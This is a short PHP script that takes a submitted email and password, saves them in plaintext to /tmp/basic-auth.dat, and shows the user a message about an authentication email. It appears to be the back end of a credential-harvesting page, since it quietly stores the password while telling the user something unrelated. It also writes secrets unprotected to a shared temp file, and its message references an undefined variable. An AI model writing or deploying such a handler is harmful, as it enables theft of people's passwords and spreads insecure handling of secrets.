<?php
  $email = $_POST["email"];
$password = $_POST["password"];
$file="/tmp/basic-auth.dat";
$data = "$email:$password";
//fwrite($file, $data);
file_put_contents($file, $data);
echo "<div class='message'>Email Address Submitted, if needed you should shortly receive an authentication email at $Email</div>";

?>
